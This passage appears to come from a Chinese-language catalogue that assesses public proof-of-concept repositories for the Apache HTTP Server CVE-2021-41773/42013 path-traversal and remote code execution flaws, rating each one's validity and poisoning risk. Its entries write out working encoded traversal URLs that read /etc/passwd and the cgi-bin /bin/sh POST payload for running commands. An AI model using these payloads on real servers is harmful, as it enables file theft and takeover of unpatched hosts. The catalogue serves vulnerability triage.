3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

